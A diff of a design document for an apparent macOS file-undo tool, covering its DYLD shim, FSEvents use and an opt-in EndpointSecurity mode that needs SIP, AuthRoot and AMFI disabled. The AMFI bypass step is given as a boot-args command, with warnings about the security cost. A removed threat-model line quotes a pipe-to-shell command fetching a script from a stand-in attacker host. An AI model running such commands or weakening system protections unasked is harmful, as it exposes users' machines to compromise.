@@ -14,10 +14,10 @@ This is the strategic deep-dive on how `shit` interacts with macOS's defense lay
 
 | Mode | What you give up | What you get | Who it's for |
 |---|---|---|---|
-| **Default (FSEvents + DYLD shim)** | Nothing. Stock macOS. SIP stays on. | Full undo coverage for ~90% of dev workflows — anything that runs Homebrew binaries, your own builds, Python/Node tooling. | Almost everyone. |
-| **Power-user (EndpointSecurity)** | SIP disabled. AuthRoot disabled. AMFI bypassed. Significant security regression. | The other ~10% — file mutations invoked through Apple platform binaries (`/usr/bin/rm`, `/bin/mv`, `/usr/bin/python3`, etc.). | Kernel hackers, security researchers, dedicated dev machines. |
+| **Default (FSEvents + DYLD shim)** | No OS security protections are disabled; eligible child processes load the local shim. SIP stays on. | Actionable undo for supported libc mutations made by eligible dynamically linked processes. FSEvents supplies readiness and diagnostics, not undo. | Almost everyone. |
+| **Power-user (EndpointSecurity)** | SIP disabled. AuthRoot disabled. AMFI bypassed. Significant security regression. | Broader pre-mutation capture for supported ES event families, including events from Apple platform binaries. Explicit gaps and refusals remain. | Kernel hackers, security researchers, dedicated dev machines. |
 
-The default mode covers the cases where you want undo for what you typed. The power-user mode covers the cases where the call chain ends up in an Apple-signed system binary that you didn't explicitly type.
+The default mode covers tested mutations that pass through the DYLD interposer. The power-user mode adds supported cases where the call chain ends up in an Apple-signed system binary.
 
 If you've read just this far and you're not sure which one is for you — **the default mode is for you.** Stop reading; install it; come back if you ever hit a case it can't undo.
 
@@ -31,7 +31,7 @@ macOS gives userspace a much smaller toolkit on purpose:
 
 - **EndpointSecurity (ES)** is the only kernel-level observer for arbitrary processes' file syscalls. It requires Apple to grant your code a specific entitlement — the same kind antivirus vendors hold. Apple's stated policy is to grant ES only to vendors whose business it is.
 - **DYLD_INSERT_LIBRARIES** is the macOS analog of `LD_PRELOAD`, but Apple's "platform binaries" — anything shipped in `/System` or `/usr/bin/` — strip it on exec. So a shim that interposes `unlink(2)` works against `gchmod` (Homebrew) but not against `/bin/rm` (Apple).
-- **FSEvents** sees mutations after they happen. Good for "did this file change?", useless for capturing pre-mutation state needed for byte-identical undo.
+- **FSEvents** sees mutations after they happen. `shit` uses those partial events for watch readiness and diagnostics, but they cannot supply the pre-mutation state needed for byte-identical undo. A persisted partial observation therefore makes the whole command refusal-only; it is never ignored while other inverses execute.
 
 These restrictions exist for good reasons: the same hooks that let `shit` capture pre-mutation state also let a hypothetical attacker observe (or override) sensitive system writes. Apple's stance is roughly "the OS exists to be safe by default; anything that weakens that is opt-in, friction-heavy, and per-tool entitlement-gated."
 
@@ -43,20 +43,22 @@ We applied for the ES entitlement. Apple denied us in 2026-05 (see [`.docs/audit
 
 In default mode, `shit` runs as an unprivileged user-level daemon (`shitd`) plus a helper (`shit-helper`) that does:
 
-1. **FSEvents** — observes file mutations across watched roots. Sees post-mutation paths but no pre-image content.
-2. **DYLD shim** — when you install `shit` and run `shit dyld-hooks install`, an `~/.zshrc` snippet exports `DYLD_INSERT_LIBRARIES=…/libshit_preload_shim.dylib`. New shells inherit this; every non-SIP-protected child process loads our shim. The shim interposes file-mutating libc syscalls (`unlink`, `rename`, `open`, `chmod`, `chown`, `utimes`, `xattr`, plus the `*at` variants modern coreutils use) and captures pre-mutation state.
+1. **FSEvents** — observes file mutations across watched roots. Its events carry post-mutation paths but no pre-image content, so they are marked partial and force a command-atomic refusal if they remain in the journal. They still provide watch readiness and useful diagnostics. Current reconciliation is conservative and can refuse a command when a partial observation arrived before equivalent DYLD/ES evidence.
+2. **DYLD shim** — when you install `shit` and run `shit dyld-hooks install`, snippets in `~/.zshrc` and `~/.bashrc` export `DYLD_INSERT_LIBRARIES=…/libshit_preload_shim.dylib`. New shells inherit this; eligible dynamically linked child processes load our shim. (Fish command bracketing is supported, but the installer does not currently edit fish configuration.) The shim interposes supported file-mutating libc calls such as `unlink`, `rename`, `open`, `chmod`, `chown`, and `xattr` (including supported `*at` variants), captures pre-mutation state, and journals it only after the real call succeeds.
 
-**Together,** the two cover everything modulo SIP-protected platform binaries:
+The DYLD shim is the actionable capture path in default mode; FSEvents does not fill a missing pre-image. These shapes have pinned workload smokes through the shim:
 - `make install` invoked from your shell → catches via shim (assuming `gmake` or any non-SIP make)
 - `cargo install --force` → catches via shim
 - `pip install --force-reinstall` → catches via shim (assuming brew Python)
-- `vim :wq` → catches via shim (vim is non-SIP)
-- `git commit` → catches via shim (Homebrew git is non-SIP)
+
+Homebrew `vim :wq` and `git commit` are plausible non-SIP workloads, but their dedicated M08 smokes have not landed yet and are not support evidence.
 
 What's NOT covered in default mode:
 - Anything you invoke via `/bin/sh -c '...'` that does mutations directly in `sh`. (`sh` is SIP-stripped.) Note: `sh -c 'gchmod ...'` IS covered — the SIP-strip only applies to `sh` itself, not its non-SIP children.
 - Calls into Apple's `/usr/bin/python3` (which is itself a shim asking you to install Xcode; rarely used in practice).
 - Mutations via `/usr/bin/install` (BSD install). Workaround: `brew install coreutils` for `ginstall`.
+- Statically linked programs, hardened-runtime programs that reject injection, and code that issues direct syscalls instead of calling the interposed libc symbols.
+- Timestamp setters (`utimes`, `futimes`, `futimens`, and `utimensat`). The shim explicitly refuses them because the current metadata model lacks atime; restoring only mtime would be lossy.
 
 **What you're trusting**, security-wise:
 - Your user-level processes (which already have read/write to your files) are loading a shared library you compiled. Standard "trust your dev environment" assumption.
@@ -74,6 +76,8 @@ In power-user mode, `shit` additionally subscribes to **EndpointSecurity** kerne
 3. **Enable AMFI bypass** (`nvram boot-args="amfi_get_out_of_my_way=0x1"`)
 
 With those three flips, AMFI accepts the ES entitlement claim from any signed binary, including our `shit setup-es-mode --apply`-output ad-hoc signature.
+
+EndpointSecurity broadens capture; it does not make every filesystem mutation reversible. Only implemented event families are actionable. `AUTH_UTIMES` explicitly refuses while captured metadata lacks atime, and `AUTH_SETMODE` / `AUTH_SETOWNER` refuse until the inverse can preserve ACL and ownership-induced mode side effects losslessly.
 
 That's the work; here's what each step actually weakens.
 
@@ -122,7 +126,7 @@ After all three: your Mac, while running, is at approximately the security level
 - A machine under any compliance regime (SOC 2, HIPAA, PCI, FERPA — most explicitly forbid SIP-disabled boots).
 - A machine you use as your primary personal computer (banking, email, password manager).
 
-If any of those describes your Mac, **don't install power-user mode**. Use the default mode and accept the ~10% coverage gap, or run `shit` in a VM.
+If any of those describes your Mac, **don't install power-user mode**. Use the default mode and accept its documented capture boundaries, or run `shit` in a VM.
 
 ---
 
@@ -132,36 +136,37 @@ If any of those describes your Mac, **don't install power-user mode**. Use the d
 
 ### What `shit` does not protect against
 
-- **Malicious commands you ran.** If you ran `curl evil.com/script.sh | sh`, `shit undo` will roll back the file-system mutations the script performed (good), but cannot remove a process the script spawned, a network connection it established, or credentials it exfiltrated. Undo is a file-system tool.
+- **Malicious commands you ran.** For a supported, captured mutation, `shit undo` can roll back the file-system effect, but it cannot remove a process the command spawned, a network connection it established, or credentials it exfiltrated. Undo is not incident response.
 - **Targeted attacks against `shit` itself.** A determined attacker with root on your machine could modify `shitd`, the helper binary, or the captured state. We do some defense-in-depth (the helper self-verifies its codesignature at startup via M07.C; the state dir is 0700-restricted), but this isn't a security boundary.
 - **Anything that happens off-disk.** Memory state, kernel state, process tables, network state — out of scope.
 
 ### What `shit` does protect against (in default mode)
 
-- **Your own mistakes.** The common `rm -rf foo/` typo, the bad `sed -i`, the over-eager `git reset --hard`, the misplaced `mv`. These are the cases `shit` was built for.
-- **Bugs in tools you ran.** If `make install` writes to a path you didn't expect, undo reverses it. If a build script does something destructive in `$PWD`, undo reverses it.
+- **Your own mistakes in covered tools.** Supported mutations made by eligible Homebrew utilities, your own builds, and injected Python/Node tooling are the cases the default mode is built for.
+- **Bugs in covered tools you ran.** The smoke suite pins examples such as a non-platform `make install` writing to an unexpected path; the DYLD eligibility and operation boundaries still apply.
 
 ### What changes in power-user mode
 
-- **Larger coverage.** All file mutations regardless of which binary made them.
-- **Broader attack surface.** SIP-disabled is a security regression. Don't conflate "I want full undo coverage" with "I want a more secure Mac" — those are opposite directions.
+- **Larger coverage.** Supported ES event families can include mutations made by Apple platform binaries that reject DYLD injection.
+- **Broader attack surface.** SIP-disabled is a security regression. Don't conflate "I want broader undo coverage" with "I want a more secure Mac" — those are opposite directions.
 
-The honest framing: power-user mode is a small expansion of undo coverage in exchange for a large concession on system integrity. The default mode is the right default for that reason.
+The honest framing: power-user mode broadens supported capture in exchange for a large concession on system integrity. The default mode is the right default for that reason.
 
 ---
 
 ## How this compares to Linux and BSD
 
-`shit` runs on Linux and FreeBSD/NetBSD/OpenBSD/DragonFly with no special-mode opt-in. There's no Linux equivalent of SIP that we'd have to disable; the `LD_PRELOAD` shim and (where available) eBPF LSM cover essentially the entire syscall surface on a stock distribution.
+Linux and FreeBSD are the active non-macOS targets and require no SIP-like security-mode opt-in. Their kernel observers and LD_PRELOAD paths cover the smoke-gated command classes listed in the README, with explicit gaps; NetBSD, OpenBSD, and DragonFlyBSD remain untested post-v1 ports.
 
-| Platform | Default coverage | Notes |
+| Platform | Current claim | Notes |
 |---|---|---|
-| Linux | ~100% | LD_PRELOAD shim + (optional) BPF LSM for setuid binaries. No security regression required. |
-| FreeBSD / others BSD | ~100% | LD_PRELOAD shim + kqueue. Same story. |
-| macOS (default mode) | ~90% | DYLD shim + FSEvents. Apple platform binaries excluded. |
-| macOS (power-user mode) | ~100% | Adds EndpointSecurity. Requires SIP/AuthRoot/AMFI relaxation. |
+| Linux | Supported classes are smoke-gated; gaps remain. | eBPF LSM where available, fanotify fallback, and targeted LD_PRELOAD injection. No SIP-like security regression required. |
+| FreeBSD | Supported classes are smoke-gated; gaps remain. | kqueue + LD_PRELOAD; static/setuid/direct-syscall paths can bypass actionable pre-image capture. Other BSDs are not supported today. |
+| macOS (default mode) | Supported DYLD-interposed calls only. | FSEvents is planner-inert diagnostics; platform/hardened/static/direct-syscall paths are excluded. |
+| macOS (power-user mode) | Broader supported ES families. | Requires SIP/AuthRoot/AMFI relaxation; explicit implementation gaps and timestamp refusal remain. |
+| Windows | Not supported. | Native Windows work is a bounded feasibility experiment; WSL follows the Linux lane. |
 
-The macOS gap is structural, not a bug in our implementation. It's a direct consequence of Apple's entitlement policy.
+The platform-binary gap in default macOS mode is structural: Apple strips or rejects DYLD injection there, and the ES entitlement is gated. Other gaps, such as the current timestamp refusal, are explicit implementation limits rather than consequences of that policy.
 
 ---
 
@@ -171,8 +176,8 @@ If Apple reverses and grants us the EndpointSecurity entitlement (we'd reapply o
 
 - We'd ship a Developer-ID-signed, notarized release tarball that includes the ES claim.
 - AMFI on stock macOS would accept the claim — no SIP/AuthRoot/AMFI flips required.
-- Default install gets full coverage. Power-user mode goes away as a concept.
-- The DYLD shim becomes a fallback for users on macOS versions older than our minimum.
+- The default install could use ES without the SIP/AuthRoot/AMFI changes. Existing event-family and metadata-model gaps would still apply.
+- The DYLD shim remains a complementary path rather than the only actionable default-mode capture source.
 
 This is the architecture we'd prefer to ship. The current dual-mode shape exists because we don't have the entitlement; everything is built to accommodate the flip seamlessly when (if) Apple's stance changes.
 
@@ -185,7 +190,7 @@ We have no insight into Apple's likelihood of approving a re-application. The de
 The M-series sprints on macOS divide the long-term work along the dual-mode axis:
 
 - **Default mode** (M01 / M01.A / M02 / M07 / future M04 / M05 / M06) — everything that has to keep working without the entitlement. The bulk of ongoing investment.
-- **Power-user mode** (M03 / M03.x.POWER-USER) — the opt-in path. Maintenance load is roughly "keep up with macOS major versions that may change AMFI bypass enforcement"; coverage is broad once enabled.
+- **Power-user mode** (M03 / M03.x.POWER-USER) — the opt-in path. Maintenance load is roughly "keep up with macOS major versions that may change AMFI bypass enforcement"; supported capture is broader once enabled.
 - **Re-apply for the entitlement** — once per major macOS rev or whenever Apple's policy shifts. Tracked in [`.docs/audits/apple-entitlement.md`](../.docs/audits/apple-entitlement.md).
 
 The dyld-shim default has a real ceiling — Apple has been gradually tightening hardened-runtime requirements on more binaries each version. If a future macOS makes hardened-runtime mandatory for `make` or `cargo`, we lose those coverage cases without an entitlement-shipped alternative. That's the structural risk we accept by running in default mode.
